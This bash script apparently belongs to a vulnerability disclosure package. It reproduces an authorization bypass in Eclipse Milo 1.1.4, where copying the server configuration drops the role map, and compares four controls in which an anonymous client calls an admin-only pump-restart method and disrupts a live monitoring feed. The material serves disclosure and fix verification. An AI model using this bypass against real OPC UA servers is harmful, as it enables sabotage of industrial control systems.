#!/usr/bin/env bash
#
# the RoleMapper-drop defect proof of concept -- one-command reproduction.
#
# Builds the IDENTICAL PoC source twice, once against vulnerable Eclipse Milo 1.1.4 (the
# default ${milo.version}) and once against fixed Milo 1.1.5 (-Dmilo.version=1.1.5), then runs
# FOUR CAUSAL CONTROLS. Every control uses the exact same application code (PocServer.java,
# ControlNamespace.java, LiveClient.java, AttackerClient.java) -- only PocServer's mode
# argument and which Milo jar it runs against differ. The point is to prove the MISSING
# ROLEMAPPER, not identity setup or harness behavior, is the sole cause of the bypass:
#
#   1. original  (1.1.4) -- RoleMapper set directly, no copy() at all           -> denied
#   2. copied    (1.1.4) -- RoleMapper-bearing config routed through copy()      -> ALLOWED (the bug)
#   3. restored  (1.1.4) -- identical copy() call, but the mapper is explicitly  -> denied
#                           re-applied afterward (isolates: nothing else differs
#                           from control 2 except the mapper being present)
#   4. copied    (1.1.5) -- identical copy() call, but against the FIXED Milo    -> denied
#                           release (copy() itself now preserves the mapper)
#
# For EACH control, three separate JVMs run against one PocServer instance:
#   - PocServer       -- hosts PumpController/PumpFlow (a live feed ticking every 300ms) and
#                        PumpController/restartPump (Call granted to AdminRole only).
#   - LiveClient      -- an INDEPENDENT legitimate monitoring client with nothing to do with the
#                        attack. Subscribes to PumpFlow before anything happens and just keeps
#                        streaming it -- a separate process, no shared state with the attacker.
#   - AttackerClient  -- connects with ZERO credentials (anonymous / ObserverRole, never granted
#                        Call), using only realistic OPC UA client operations (Browse, Read,
#                        Call) -- no internal objects, no shared state -- and Calls restartPump
#                        partway through LiveClient's stream.
#
# Every control's actual Call outcome and victim impact is checked by run.sh itself against the
# expected outcome above; ANY mismatch makes the whole run exit non-zero.
#
# Usage:
#   ./run.sh            # all four causal controls (1.1.4 x3 + 1.1.5 x1)
#   ./run.sh --vuln     # controls 1-3 only (against 1.1.4)
#   ./run.sh --fixed    # control 4 only (against 1.1.5)
set -u
cd "$(dirname "$0")"

PORT="${POC_PORT:-12786}"
EVIDENCE_DIR="${EVIDENCE_DIR:-$(cd .. && pwd)/evidence}"
mkdir -p "$EVIDENCE_DIR"
RUN_TS="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

MODE="${1:-both}"

# LiveClient runs for LIVE_DURATION seconds total; the attack lands after ATTACK_DELAY seconds
# of already-healthy streaming, leaving LIVE_DURATION - ATTACK_DELAY seconds to observe the
# aftermath (feed dead if the Call was allowed, still healthy if it was denied).
LIVE_DURATION="${POC_LIVE_DURATION:-12}"
ATTACK_DELAY="${POC_ATTACK_DELAY:-4}"

MVN_OPTS=(-q)
# Offline is safe here: both 1.1.4 and 1.1.5 are expected to already be present in the local
# Maven repository. If either is missing, drop -o (or run `mvn -q dependency:go-offline` once
# with network access first).
if [ "${POC_OFFLINE:-1}" = "1" ]; then
  MVN_OPTS+=(-o)
fi

sha256_of() {
  if command -v shasum >/dev/null 2>&1; then shasum -a 256 "$1" | awk '{print $1}';
  else sha256sum "$1" | awk '{print $1}'; fi
}

record_environment() {
  local env_log="$EVIDENCE_DIR/environment.log"
  {
    echo "# the RoleMapper-drop defect evidence -- build/runtime environment -- captured $RUN_TS UTC"
    echo
    echo "\$ java -version"
    java -version 2>&1
    echo
    echo "\$ mvn -version"
    mvn -version 2>&1
    echo
    echo "\$ uname -a"
    uname -a 2>&1
  } > "$env_log"
  echo "[env] recorded to $env_log"
}

record_artifact_hashes() {
  local hash_log="$EVIDENCE_DIR/artifact-hashes.log"
  {
    echo "# the RoleMapper-drop defect evidence -- exact dependency artifact identities -- captured $RUN_TS UTC"
    echo "# sha256 of each released Eclipse Milo jar this PoC was built against, resolved from"
    echo "# the local Maven repository (~/.m2), one row per (artifact, version)."
    echo
    for v in 1.1.4 1.1.5; do
      for a in milo-sdk-server milo-sdk-client milo-stack-core milo-transport; do
        local jar="$HOME/.m2/repository/org/eclipse/milo/$a/$v/$a-$v.jar"
        if [ -f "$jar" ]; then
          printf '%s  %s:%s\n' "$(sha256_of "$jar")" "$a" "$v"
        else
          printf '(missing)  %s:%s (%s not found)\n' "$a" "$v" "$jar"
        fi
      done
    done
  } > "$hash_log"
  echo "[hashes] recorded to $hash_log"
}

build() {
  local version="$1" outjar="$2"
  echo "[build] milo.version=$version"
  mvn "${MVN_OPTS[@]}" clean package -DskipTests -Dmilo.version="$version" || return 1
  cp target/rolemapper-poc.jar "$outjar"
}

wait_ready() {
  local logfile="$1" n=0
  until grep -q POC_SERVER_READY "$logfile" 2>/dev/null; do
    sleep 1; n=$((n+1))
    if [ "$n" -gt 60 ]; then echo "ERROR: server did not become ready"; return 1; fi
  done
}

# Extract the value of key=<value> from a whitespace-separated "key=value key=value ..." line.
field() {
  local line="$1" key="$2"
  echo "$line" | grep -oE "(^| )${key}=[^ ]*" | tail -1 | cut -d= -f2-
}

# run_control idx label mode jar version_label expected_call(ALLOWED|DENIED)
# Populates the global arrays RESULT_LABEL/RESULT_MODE/RESULT_VERSION/RESULT_EXPECTED/
# RESULT_ACTUAL/RESULT_IMPACT/RESULT_PASS (index-aligned) for the final summary + exit code.
run_control() {
  local idx="$1" label="$2" mode="$3" jar="$4" version_label="$5" expected="$6"
  local endpoint="opc.tcp://localhost:$PORT/poc"
  local server_log="$EVIDENCE_DIR/server-$label.log"
  local live_log="$EVIDENCE_DIR/live-$label.log"
  local attack_log="$EVIDENCE_DIR/attack-$label.log"

  echo
  echo "------------------------------------------------------------"
  echo "[control $idx] $label  (mode=$mode, Milo $version_label, expected Call=$expected)"

  {
    echo "# the RoleMapper-drop defect evidence -- control $idx ($label) -- captured $RUN_TS UTC"
    echo "\$ java -cp $jar poc.PocServer $mode $PORT"
    echo
  } > "$server_log"

  java -cp "$jar" poc.PocServer "$mode" "$PORT" >> "$server_log" 2>&1 &
  local server_pid=$!
  if ! wait_ready "$server_log"; then
    echo "[control $idx] server failed to start"; cat "$server_log"; kill "$server_pid" 2>/dev/null
    RESULT_IDX+=("$idx"); RESULT_LABEL+=("$label"); RESULT_MODE+=("$mode"); RESULT_VERSION+=("$version_label")
    RESULT_EXPECTED+=("$expected"); RESULT_ACTUAL+=("SERVER_START_FAILED"); RESULT_IMPACT+=("N/A")
    RESULT_PASS+=("FAIL")
    return
  fi

  {
    echo "# the RoleMapper-drop defect evidence -- control $idx ($label) -- captured $RUN_TS UTC"
    echo "\$ java -cp $jar poc.LiveClient $endpoint $LIVE_DURATION"
    echo
  } > "$live_log"
  java -cp "$jar" poc.LiveClient "$endpoint" "$LIVE_DURATION" >> "$live_log" 2>&1 &
  local live_pid=$!

  sleep "$ATTACK_DELAY"

  {
    echo "# the RoleMapper-drop defect evidence -- control $idx ($label) -- captured $RUN_TS UTC"
    echo "\$ java -cp $jar poc.AttackerClient $endpoint"
    echo
  } > "$attack_log"
  java -cp "$jar" poc.AttackerClient "$endpoint" >> "$attack_log" 2>&1

  wait "$live_pid" 2>/dev/null
  kill "$server_pid" 2>/dev/null
  wait "$server_pid" 2>/dev/null

  # ---- actual Call outcome ----
  local call_good actual
  call_good=$(field "$(grep ATTACK_CALL_RESULT "$attack_log")" good)
  if [ "$call_good" = "true" ]; then actual="ALLOWED"; else actual="DENIED"; fi

  # ---- correlate LiveClient's heartbeats against the moment of the Call ----
  local attack_ts before_line after_line
  attack_ts=$(field "$(grep ATTACK_CALL_RESULT "$attack_log")" ts)
  before_line=""
  while IFS= read -r hb; do
    local hb_ts
    hb_ts=$(field "$hb" ts)
    if [ -n "$hb_ts" ] && [ -n "$attack_ts" ] && [ "$hb_ts" -le "$attack_ts" ]; then
      before_line="$hb"
    fi
  done < <(grep LIVE_HEARTBEAT "$live_log")
  after_line=$(grep LIVE_HEARTBEAT "$live_log" | tail -1)

  local before_n after_n after_status impact
  before_n=$(field "$before_line" notifications)
  after_n=$(field "$after_line" notifications)
  after_status=$(field "$after_line" lastStatus)
  if [ "$after_status" = "Good" ]; then impact="CONTINUOUS"; else impact="DISRUPTED"; fi

  {
    echo
    echo "IMPACT_COMPARISON attack_ts=$attack_ts"
    echo "  last heartbeat at/before the Call : $before_line"
    echo "  final heartbeat (end of stream)    : $after_line"
    echo "IMPACT_VERDICT $impact (notifications $before_n -> $after_n, finalStatus=$after_status)"
  } >> "$live_log"

  # ---- expected impact follows directly from expected Call outcome ----
  local expected_impact
  if [ "$expected" = "ALLOWED" ]; then expected_impact="DISRUPTED"; else expected_impact="CONTINUOUS"; fi

  local pass="PASS"
  [ "$actual" != "$expected" ] && pass="FAIL"
  [ "$impact" != "$expected_impact" ] && pass="FAIL"

  echo "[control $idx] Call: actual=$actual expected=$expected | Victim impact: actual=$impact expected=$expected_impact | $pass"

  RESULT_IDX+=("$idx"); RESULT_LABEL+=("$label"); RESULT_MODE+=("$mode"); RESULT_VERSION+=("$version_label")
  RESULT_EXPECTED+=("$expected"); RESULT_ACTUAL+=("$actual"); RESULT_IMPACT+=("$impact")
  RESULT_PASS+=("$pass")
}

RESULT_IDX=(); RESULT_LABEL=(); RESULT_MODE=(); RESULT_VERSION=(); RESULT_EXPECTED=(); RESULT_ACTUAL=()
RESULT_IMPACT=(); RESULT_PASS=()

record_environment
record_artifact_hashes

case "$MODE" in
  --vuln)
    build 1.1.4 target/vulnerable.jar || exit 1
    run_control 1 c1-original          original target/vulnerable.jar 1.1.4 DENIED
    run_control 2 c2-copied-vulnerable copied   target/vulnerable.jar 1.1.4 ALLOWED
    run_control 3 c3-restored          restored target/vulnerable.jar 1.1.4 DENIED
    ;;
  --fixed)
    build 1.1.5 target/fixed.jar || exit 1
    run_control 4 c4-copied-fixed copied target/fixed.jar 1.1.5 DENIED
    ;;
  both|*)
    build 1.1.4 target/vulnerable.jar || exit 1
    run_control 1 c1-original          original target/vulnerable.jar 1.1.4 DENIED
    run_control 2 c2-copied-vulnerable copied   target/vulnerable.jar 1.1.4 ALLOWED
    run_control 3 c3-restored          restored target/vulnerable.jar 1.1.4 DENIED
    build 1.1.5 target/fixed.jar || exit 1
    run_control 4 c4-copied-fixed copied target/fixed.jar 1.1.5 DENIED
    ;;
esac

# ===========================================================================
# One concise, screenshot-friendly terminal summary. Full per-control logs are in evidence/.
#
# NOTE: OVERALL must be computed in THIS shell, not inside a `{ ... } | tee` pipeline -- the
# left side of a pipe runs in a subshell in bash, so a variable set there would silently vanish
# and the exit-code check below would never see a failure. Compute it first, then just print.
OVERALL="PASS"
for i in "${!RESULT_LABEL[@]}"; do
  [ "${RESULT_PASS[$i]}" = "FAIL" ] && OVERALL="FAIL"
done

SUMMARY_LOG="$EVIDENCE_DIR/summary.log"
{
  echo "============================================================"
  echo "the RoleMapper-drop defect -- OpcUaServerConfig.copy() drops RoleMapper -- CAUSAL VERDICT MATRIX"
  echo "captured $RUN_TS UTC"
  echo "------------------------------------------------------------"
  printf '%-2s %-24s %-7s %-9s %-9s %-11s %-4s\n' "#" "control" "milo" "expected" "actual" "victim" "pass"
  for i in "${!RESULT_LABEL[@]}"; do
    printf '%-2s %-24s %-7s %-9s %-9s %-11s %-4s\n' \
      "${RESULT_IDX[$i]}" "${RESULT_MODE[$i]}" "${RESULT_VERSION[$i]}" "${RESULT_EXPECTED[$i]}" \
      "${RESULT_ACTUAL[$i]}" "${RESULT_IMPACT[$i]}" "${RESULT_PASS[$i]}"
  done
  echo "------------------------------------------------------------"
  if [ "${#RESULT_LABEL[@]}" -eq 4 ]; then
    echo "Root cause isolated: across controls 1-3 the ONLY variable is whether the RoleMapper"
    echo "survives onto the running config (same Milo 1.1.4 build, same application code every"
    echo "time). Control 3 (mapper explicitly restored after copy()) returning to DENIED, with"
    echo "nothing else changed from control 2, is the causal clincher."
    echo "\"Copying the server configuration silently erased its entire role map and made RBAC"
    echo "fail open.\""
    echo "------------------------------------------------------------"
  fi
  echo "OVERALL: $OVERALL"
  echo "============================================================"
} | tee "$SUMMARY_LOG"

echo
echo "Evidence directory: $EVIDENCE_DIR"

if [ "$OVERALL" != "PASS" ]; then
  exit 1
fi
